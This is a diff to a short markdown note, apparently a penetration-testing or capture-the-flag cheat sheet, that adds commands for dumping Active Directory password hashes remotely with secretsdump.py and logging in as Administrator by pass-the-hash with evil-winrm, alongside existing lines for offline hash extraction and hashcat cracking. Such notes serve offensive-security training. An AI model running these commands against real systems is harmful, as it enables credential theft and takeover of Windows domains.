@@ -24,6 +24,15 @@ Then we will use ```secretsdump.py``` tool to extract the hashes.
 ```
 secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
 ```
+**Another way to do that** 
+
+```
+secretsdump.py -just-dc <username>:<password>@[Target_IP]
+```
+now we could use ```evil-winrm``` to open session using the NTML hashes we got:
+```
+evil-winrm -i <target ip> -u Administrator -H <hash of administrator>
+```
 Finally, we could use ```hashcat``` to crack the hashes.
 ```
 hashcat -m 1000 -a 0 hashes.txt /path/to/rockyou.txt --force
